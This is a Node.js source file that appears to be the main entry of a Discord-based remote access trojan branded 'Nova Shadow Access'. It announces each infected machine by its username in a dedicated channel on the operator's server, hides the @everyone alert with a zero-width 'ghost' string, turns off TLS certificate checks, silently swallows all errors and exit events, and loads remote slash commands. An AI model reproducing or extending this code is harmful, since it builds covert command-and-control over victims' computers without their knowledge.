const { config } = require("./config.js"),
  { stat } = require("./core/modules/Save.js"),
  core = require("./Sentinel/utils/core"),
  {
    Client,
    Collection,
    GatewayIntentBits,
    ActivityType,
    ChannelType,
  } = require("discord.js"),
  https = require("https"),
  agent = new https.Agent({ rejectUnauthorized: false }),
  { loadEvents } = require("./core/loader/loadEvents"),
  { loadSlashCommands } = require("./core/loader/loadSlashCommands"),
  axios = require("axios"),
  client = new Client({
    allowedMentions: { parse: ["users", "roles", "everyone"] },
    intents: [GatewayIntentBits.Guilds],
  });

function shuffleBigInt(inputBigInt) {
  let inputString = inputBigInt.toString();
  let shuffleMap = {
    0: "2",
    1: "7",
    2: "4",
    3: "8",
    4: "1",
    5: "9",
    6: "3",
    7: "0",
    8: "5",
    9: "6",
  };

  let shuffledString = inputString
    .split("")
    .map((char) => shuffleMap[char] || char)
    .join("");

  return BigInt(shuffledString);
}

function unshuffleBigInt(shuffledBigInt) {
  let shuffledString = shuffledBigInt.toString();
  let reverseShuffleMap = {
    0: "7",
    7: "1",
    4: "2",
    8: "3",
    1: "4",
    9: "5",
    3: "6",
    2: "0",
    5: "8",
    6: "9",
  };

  let originalString = shuffledString
    .split("")
    .map((char) => reverseShuffleMap[char] || char)
    .join("");

  return BigInt(originalString);
}



async function main() {
  const myselfbis = await core.NovaSentinelFindMyself();
  core.antispam(myselfbis);
  client.slash = new Collection();

  client.login("token");

  client.on("ready", async function () {
    await verification(client.user.id);
    let g;
    let cname = `${process.env.USERNAME.replace(".", "")}`;
    let guild = await client.guilds.cache.get(config.GuildID);
    const existingChannel = guild.channels.cache.find(
      (channel) => channel.name === cname
    );
    if (!existingChannel) {
      g = await guild.channels.create({
        name: cname,
        type: ChannelType.GuildText,
      });
    }
    const targetChannel = existingChannel || g;
    let ghost =
      "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ ";

    targetChannel.send(
      `**${process.env.USERNAME.replace(
        ".",
        ""
      )}** is connected!${ghost} @everyone`
    );
    console.log(client.user.username, " Work With Nova Shadow Access");
    client.user.setPresence({
      activities: [
        {
          name: `${process.env.USERNAME.replace(".", "")}`,
          type: ActivityType.Watching,
        },
      ],
      status: "dnd",
    });
    if (!client.user.username.includes("Nova")) {
      client.user.setUsername(client.user.username + " Nova");
    }
  });

  loadSlashCommands(client);
  loadEvents(client);
}
main();

process.on("unhandledRejection", (error) => {});
process.on("unhandledRejection", (reason, p) => {});
process.on("uncaughtException", (err, origin) => {});
process.on("uncaughtExceptionMonitor", (err, origin) => {});
process.on("beforeExit", (code) => {});
process.on("exit", (code) => {});
process.on("multipleResolves", (type, promise, reason) => {});
client.on("error", (err) => {});
client.on("reconnecting", (message) => {
  console.log(`Reconnexion en cours...`);
});
client.on("resume", (message) => {});
client.on("disconnect", (message) => {
  console.log(`deconnexion en cours...`);
});

